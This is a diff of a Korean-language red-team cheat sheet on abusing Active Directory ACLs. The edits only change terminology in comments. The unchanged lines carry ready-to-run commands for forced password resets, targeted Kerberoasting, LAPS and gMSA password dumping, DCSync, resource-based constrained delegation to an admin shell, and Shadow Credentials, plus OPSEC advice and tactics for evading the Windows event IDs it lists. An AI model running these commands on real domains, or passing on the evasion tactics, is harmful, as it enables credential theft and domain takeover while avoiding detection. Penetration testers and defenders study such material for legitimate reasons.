@@ -61,7 +61,7 @@ Get-DomainObjectAcl -Identity <target> -ResolveGUIDs |
 | Domain | DCSync 권한 부여 (WriteDACL 경유) |
 
 ```bash
-# 사용자: 패스워드 강제 변경
+# 사용자: password 강제 변경
 bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
   set password <target_user> '<new_pass>'
 
@@ -79,7 +79,7 @@ bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
 객체의 속성(`servicePrincipalName`, `msDS-KeyCredentialLink`, `scriptPath`, `userAccountControl` 등) 을 수정.
 
 ```bash
-# Targeted Kerberoasting (User에 SPN 추가 → 해시 요청 → 정리)
+# Targeted Kerberoasting (User에 SPN 추가 → hash 요청 → 정리)
 bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
   set object <target_user> servicePrincipalName -v 'HTTP/fake.<domain>'
 impacket-GetUserSPNs '<domain>/<user>:<pass>' -dc-ip <dc_ip> -request \
@@ -145,7 +145,7 @@ net rpc password <target_user> '<new_pass>' \
 ```
 
 !!! warning "OPSEC"
-    패스워드 강제 변경은 매우 시끄럽다. 사용자가 로그인 못하게 되어 즉시 발견될 가능성이 높음. **Shadow Credentials** 또는 **Targeted Kerberoasting** 이 가능하면 우선 시도.
+    password 강제 변경은 매우 시끄럽다. 사용자가 로그인 못하게 되어 즉시 발견될 가능성이 높음. **Shadow Credentials** 또는 **Targeted Kerberoasting** 이 가능하면 우선 시도.
 
 ### AddMember (Self / All-Member)
 
@@ -170,7 +170,7 @@ net rpc group addmem "<group>" "<user>" \
 모든 확장 권한 (`User-Force-Change-Password`, `DS-Replication-Get-Changes`, `Read-LAPS-Password` 등).
 
 ```bash
-# LAPS 패스워드 읽기 (Legacy ms-MCS-AdmPwd)
+# LAPS password 읽기 (Legacy ms-MCS-AdmPwd)
 nxc ldap <dc_ip> -u <user> -p '<pass>' -M laps
 bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
   get object <computer> --attr ms-MCS-AdmPwd
@@ -190,7 +190,7 @@ gMSADumper.py -u <user> -p '<pass>' -d <domain>
 
 ## DCSync (DS-Replication-Get-Changes / -All)
 
-도메인 컨트롤러처럼 행동해 모든 사용자 NT 해시를 복제 받는 공격.
+도메인 컨트롤러처럼 행동해 모든 사용자 NT hash를 복제 받는 공격.
 
 ```bash
 # 권한이 이미 있을 때
@@ -244,7 +244,7 @@ graph LR
     A --> C[Create fake$ computer]
     C --> D[Set RBCD: fake$ allowed to act on Target]
     D --> E[S4U2Self/S4U2Proxy as Administrator]
-    E --> F[Target 로컬 관리자 쉘]
+    E --> F[Target 로컬 관리자 shell]
 ```
 
 ---
@@ -274,13 +274,13 @@ certipy shadow auto -account <target> -clear ...
 
 - ACL 변경 이벤트: `4662` (Object Access), `5136` (Directory Service Changes), `4670` (Permissions changed). DC SACL 이 켜져 있으면 모두 기록됨
 - 멤버 추가: `4728` / `4732` / `4756` (Security/Distribution group)
-- 패스워드 강제 변경: `4724` (Admin reset)
+- password 강제 변경: `4724` (Admin reset)
 - Kerberoasting 요청: `4769` (Service Ticket Request, 주로 RC4 + 비표준 SPN)
 - DCSync: `4662` 에 `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes) GUID 포함
 
 탐지 회피를 위해:
 
-1. **시간 분산**: 수정 → 익스플로잇 → 복구 사이에 의도적 지연
+1. **시간 분산**: 수정 → exploit → 복구 사이에 의도적 지연
 2. **권한 부여보다 일회성 사용**: 가능하면 ForceChangePassword 보다 Shadow Credentials, AddMember 보다 Targeted Kerberoasting 우선
 3. **non-DC 경유 작업 금지**: ACL 변경은 결국 DC 에 기록됨
 
